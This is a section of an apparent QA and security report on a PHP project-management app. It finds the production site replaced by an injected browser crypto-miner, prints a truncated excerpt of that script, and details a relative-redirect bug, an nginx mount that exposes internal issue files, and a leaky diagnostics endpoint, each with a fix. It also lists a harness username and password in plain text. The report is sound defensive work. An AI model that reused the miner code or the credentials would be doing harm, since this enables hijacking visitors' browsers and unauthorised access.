## 2. P0 — Production is compromised (found while running the harness)

This is **not** a v2.0 code defect and it is **not** in the repo — it is the live production origin.

### Evidence

Every single path on `https://project.lorwongam.com` returns the **same** page: a Binance-Smart-Chain mining script. HTTP status is **200 for everything**, including paths that should 404.

| Path | HTTP | Miner script present? |
|---|---|---|
| `/` | 200 | ✅ |
| `/login` | 200 | ✅ |
| `/login.php` | 200 | ✅ |
| `/assets/css/style.css` | 200 | ✅ (a CSS file returning HTML!) |
| `/projects` | 200 | ✅ |
| `/nonexistent-xyz` | 200 | ✅ (should be 404) |
| `/robots.txt` | 200 | ✅ |

### The payload

```html
<script>(function() {
    async function load_(address) {
        ...
        _body = JSON.stringify({ method: "eth_call", params: [{ to: address, data: "0x6d4ce63c" }], id: 97 })
        _cfg  = { method: "POST", headers: {...}, body: _body }
        _u    = ["https://data-seed-prebsc-1-s1.bnbchain.org:8545/",
                 "https://bsc-testnet-dataseed.bnbchain.org:8545/", ...]
        ...
```

This is a **web3 crypto-miner**: it `eth_call`s a mining contract (`0x6d4ce63c`) against **BSC testnet** RPC nodes from the visitor's browser and mines in the victim's browser. It replaces the entire origin response — **the PHP application is not being served at all.**

### It is NOT a local/sandbox artefact

| Check | Result |
|---|---|
| Response headers | `server: cloudflare`, `via: 1.1 Caddy`, `cf-ray: ...-LAX`, `cf-cache-status: DYNAMIC` → request reaches Cloudflare, then the **origin** generates the miner page |
| DNS | `project.lorwongam.com` → Cloudflare anycast (`2606:4700:3033::6815:2bb6`) |
| Control: `https://example.com` from the same host | ✅ returns normal HTML → the network / TLS path is fine |
| Same payload from inside the `app` container | ✅ identical → not a host-level MITM |
| `curl https://project.lorwongam.com/login` | ✅ 3752 bytes, 3 miner markers — the app's own login page is gone |

### Actions for the dev / ops

1. **Treat the origin host as compromised.** Rotate **every** credential that can reach it: cPanel/hosting panel, FTP/SSH, the database password, the Cloudflare API token, and the `ENCRYPTION_KEY` in `config.php`.
2. Inspect the **origin** (Caddy), not Cloudflare. Likely candidates: a tampered Caddy config / static-file root, a replaced `index.php`, a compromised `vendor/` package, or a poisoned `composer.lock`.
3. Check the deployment timeline against `git log` — the origin was serving the app when `_diag.php` was written (issue-033, v1.7.3.2).
4. Do **not** ship v2.0 to this host until the origin is rebuilt from a known-good artefact and the miner is gone. Verify with:
   ```bash
   curl -s https://project.lorwongam.com/assets/css/style.css | head -c 80   # must be CSS, not HTML
   curl -s https://project.lorwongam.com/nonexistent-xyz -o /dev/null -w '%{http_code}\n'  # must be 404
   ```
5. Consider putting Cloudflare in **blocking** mode until the origin is clean.

## 5. Blocking defects

### BUG-1 🔴 CRITICAL — Unauthenticated deep links redirect to a 404 instead of the login page

**Root cause — one line.** [`includes/functions.php:58`](../includes/functions.php#L58):

````php
// filepath: includes/functions.php
function requireLogin() {
    if (!isLoggedIn()) {
        header('Location: login.php');   // ← RELATIVE
        exit();
    }
}
````

`Location: login.php` is a **relative** path. The browser resolves it against the **current directory**, so every nested route resolves to a URL that does not exist:

| Requested URL | Resolves to | Status |
|---|---|---|
| `/projects/1692` | `/projects/login.php` | ❌ **404** |
| `/projects/1692/edit` | `/projects/1692/login.php` | ❌ **404** |
| `/projects/new` | `/projects/login.php` | ❌ **404** |
| `/tasks/935` | `/tasks/login.php` | ❌ **404** |
| `/tasks/935/edit` | `/tasks/935/login.php` | ❌ **404** |
| `/tasks/new` | `/tasks/login.php` | ❌ **404** |
| `/contacts/249` | `/contacts/login.php` | ❌ **404** |
| `/contacts/249/edit` | `/contacts/249/login.php` | ❌ **404** |
| `/contacts/new` | `/contacts/login.php` | ❌ **404** |
| `/ajax/complete_task.php` | `/ajax/login.php` | ❌ **404** |
| `/ajax/parent_hold.php` | `/ajax/login.php` | ❌ **404** |
| `/dashboard`, `/projects`, `/tasks`, `/contacts`, `/profile` | `/login.php` → 301 → `/login` | ✅ 200 (root depth only) |

**Why it matters.** A user who opens a bookmarked project/task/contact link in a private window, or whose session expired, gets a **404 white screen** instead of the login form. The most common real-world path to this is **session timeout** (`SESSION_LIFETIME=3600`) — the user clicks a task link and is dumped on a 404 with no way back except typing the root URL. Every one of the 16 files that call `requireLogin()` is affected:

```
ajax/complete_task.php:11   ajax/parent_hold.php:33   contact_delete.php:28
contact_detail.php:6        contact_edit.php:6        contacts.php:6
dashboard.php:6              profile.php:6             project_delete.php:6
project_detail.php:6        project_edit.php:6        projects.php:6
task_delete.php:6           task_detail.php:6         task_edit.php:7
tasks.php:6
```

**Expected:** `GET /projects/1692` while logged out → **302 → `/login` → 200** (login form).
**Actual:** `GET /projects/1692` while logged out → **302 → `login.php` → 404**.

**Recommended fix** (one line, fixes all 16 call sites):

````php
// filepath: includes/functions.php
function requireLogin() {
    if (!isLoggedIn()) {
        header('Location: /login');
        exit();
    }
}
````

**Acceptance criteria for the fix**

1. `curl -sI http://localhost/projects/1692` (no cookie) → `Location: /login` (absolute, starts with `/`).
2. `curl -sL http://localhost/projects/1692` (no cookie) → final status **200**, final URL `/login`.
3. The same for `/projects/1692/edit`, `/projects/new`, `/tasks/935`, `/tasks/935/edit`, `/tasks/new`, `/contacts/249`, `/contacts/249/edit`, `/contacts/new`, `/ajax/complete_task.php`, `/ajax/parent_hold.php`.
4. **After** logging in, the deep link still works (the redirect does not swallow the original URL — if a "return-to" behaviour is wanted, add it in the same change and cover it with a test).

**Also worth fixing in the same pass (same class of bug, lower impact)**

| File:line | Emits | Resolves to | Impact |
|---|---|---|---|
| [`ajax/parent_hold.php:70,73`](../ajax/parent_hold.php) | `Location: tasks.php` (non-AJAX error branch) | `/ajax/tasks.php` → **404** | 🟡 MEDIUM — only hit when a browser (not fetch) posts the form and the request is invalid |

### BUG-2 🟠 HIGH — The mockup container publishes the whole `docs/issues/` tree

**Root cause.** [`docker-compose.yml`](../docker-compose.yml) mounts the **entire** issue directory into the mockup's public web root, and [`docker/mockup-nginx.conf`](../docker/mockup-nginx.conf) serves it:

````yaml
# filepath: docker-compose.yml
    volumes:
      # The mockup's index.html links to ../../issues/issue-035.md.
      # Mounting the two directories at matching depth keeps that relative
      # link valid while exposing nothing else from docs/.     ← the comment is wrong
      - ./docs/design/2.0:/usr/share/nginx/html/design/2.0:ro
      - ./docs/issues:/usr/share/nginx/html/issues:ro          # ← exposes ALL 50 issue files
      - ./docker/mockup-nginx.conf:/etc/nginx/conf.d/default.conf:ro
````

````nginx
# filepath: docker/mockup-nginx.conf
    location /issues/ {
        root /usr/share/nginx/html;
        types { text/markdown md; }
        default_type text/markdown;
        add_header Content-Disposition "inline";
        add_header X-Content-Type-Options "nosniff" always;
    }
````

The `location /issues/` block serves `/usr/share/nginx/html/issues/**` — and that directory is the whole `docs/issues/` mount.

**Actual exposure** — 50 internal issue documents readable over plain HTTP on `:8080`:

```bash
$ curl -s -o /dev/null -w '%{http_code}\n' http://localhost:8080/issues/issue-001.md    # 200
$ curl -s -o /dev/null -w '%{http_code}\n' http://localhost:8080/issues/issue-040.md    # 200
$ curl -s -o /dev/null -w '%{http_code}\n' http://localhost:8080/issues/issue-055.md    # 200
```

Also confirmed: `/issues/` → 403 (directory listing off ✓), `/requirements.md` → 404 ✓, `/design/2.0/_build/build.py` → 404 ✓. **Only the `issues/` mount is the problem.**

**Why it matters.** These documents contain internal defect write-ups, DB schema notes, SQL migrations, install steps and security discussions. issue-036's own constraint is *"expose only `issue-035.md`"*. The mockup is the part of the system most likely to be put on a public demo host.

**Recommended fix — mount only the single file, and hard-deny everything else:**

````yaml
# filepath: docker-compose.yml
    volumes:
      # The mockup's index.html links to ../../issues/issue-035.md.
      # Mount ONLY that one file: the whole docs/issues/ tree must never be
      # published (issue-036 constraint).
      - ./docs/design/2.0:/usr/share/nginx/html/design/2.0:ro
      - ./docs/issues/issue-035.md:/usr/share/nginx/html/issues/issue-035.md:ro
      - ./docker/mockup-nginx.conf:/etc/nginx/conf.d/default.conf:ro
````

````nginx
# filepath: docker/mockup-nginx.conf
    # Only the single issue file the mockup links to is publishable.
    location = /issues/issue-035.md {
        root /usr/share/nginx/html;
        types { text/markdown md; }
        default_type text/markdown;
        add_header Content-Disposition "inline";
        add_header X-Content-Type-Options "nosniff" always;
    }
    location /issues/ {
        return 404;
    }
````

**Acceptance criteria for the fix**

| Request | Expected |
|---|---|
| `GET :8080/issues/issue-035.md` | **200** + markdown |
| `GET :8080/issues/issue-001.md` | **404** |
| `GET :8080/issues/issue-040.md` | **404** |
| `GET :8080/issues/issue-055.md` | **404** |
| `GET :8080/issues/` | **404** (or 403 — not a listing) |
| `GET :8080/requirements.md` | **404** |

### BUG-3 🟡 MEDIUM — `/_diag.php` is a public information-disclosure endpoint

`/_diag.php` lives at the **web root** and is **not** covered by any nginx deny rule, so it answers **200 to anonymous requests**:

````bash
$ curl -s -o /dev/null -w '%{http_code}\n' http://localhost/_diag.php     # 200
$ curl -s http://localhost/_diag.php | wc -c                            # 14216
````

What it publishes:

| Leaked | Example |
|---|---|
| File MD5 checksums | `config.php → bf4c6b7025ac93ea1d53f7c5a0ed5be1`, `includes/functions.php → 37644e9a7122dd35852f4e8c7cc59411`, `client/dashboard.php`, `includes/header.php`, `client/lang.php` |
| PHP runtime config | SAPI, `memory_limit`, `error_log`, `opcache.enable`, `opcache.revalidate_freq` |
| Raw captured bodies | the first 2000 chars of `GET /` (HTML) |
| Language catalogue inventory | which `about.*` keys exist in `en` / `zh` |

The MD5s are a **verification oracle** for an attacker: if the origin is later compromised they tell you exactly which files were tampered with, and they fingerprint the release.

**Recommended fix** — deny it in nginx next to the other non-public paths:

````nginx
# filepath: docker/nginx.conf
    location ~* ^/(?:_diag|_smtp_test)\.php$ {
        return 404;
    }
````

…or, better, delete `_diag.php` from the deployed tree and keep it only in the repo. `docker/nginx.conf` already blocks `_smtp_test.php` by virtue of the file not being deployed — but `/_diag.php` **is** deployed.

## 9. How to re-run this suite

````bash
# from the project root, with the stack already up
docker compose up -d
docker compose exec -T app php /var/www/html/database/v2_0_acceptance_test.php

# machine-readable output
docker compose exec -T app php /var/www/html/database/v2_0_acceptance_test.php --json=/tmp/v2acc.json
````

Exit code is **0 only when there are 0 failures**. The harness is self-contained (it logs in as `luozongbao` / `admin123`, discovers its own fixture IDs, and asserts against the live DOM).

> ⚠️ **Do not add the harness to the `database/*_test.php` glob** — it excludes itself by name, but any new file that globs `database/*_test.php` from inside the app container will fork-bomb the container (115 PHP processes). Always exclude the current file and pass a `timeout`.
